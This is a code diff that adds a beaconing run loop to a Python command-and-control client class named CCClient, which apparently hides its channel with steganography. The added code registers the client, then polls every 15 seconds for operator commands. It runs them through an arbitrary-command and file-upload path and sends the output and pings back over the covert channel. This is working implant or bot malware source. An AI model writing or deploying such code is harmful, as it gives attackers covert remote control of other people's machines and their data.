@@ -1,10 +1,12 @@
 import os.path
+import time
 
 from ..steno import steno_base
 from ..ccchanel import ccchanel_base
 from ..ccchanel import log as cclog
 from ..client import payloads as cpayload
 from ..client import exec as cexec
+from ..ccchanel.log import cclog_append
 
 
 class CCClient(object):
@@ -43,3 +45,22 @@ class CCClient(object):
             return f"file: {local_file_path} uploaded to {remote_file_path}".encode()
         else:
             return cexec.execute_arbitrary_command(local_path, *args)
+
+    def log_append(self, payload):
+        return cclog_append(self.ccchanel, self.own_log, payload, self.steno_base)
+
+    def run(self):
+        sleep_time = 15
+        # id = cid.id()
+        if not self.is_registered():
+            self.register()
+        self.tell_alive()
+        while True:
+            cmd = self.get_command()
+            if cmd is not None:
+                cmd_id = cmd['timestamp']
+                exec_out = self.execute_command(cmd['kind'], *cmd['args']).decode()
+                self.log_append(cpayload.done_create(cmd_id, exec_out))
+            print(f"SLEEP {sleep_time}")
+            time.sleep(sleep_time)
+            self.log_append(cpayload.ping_create())
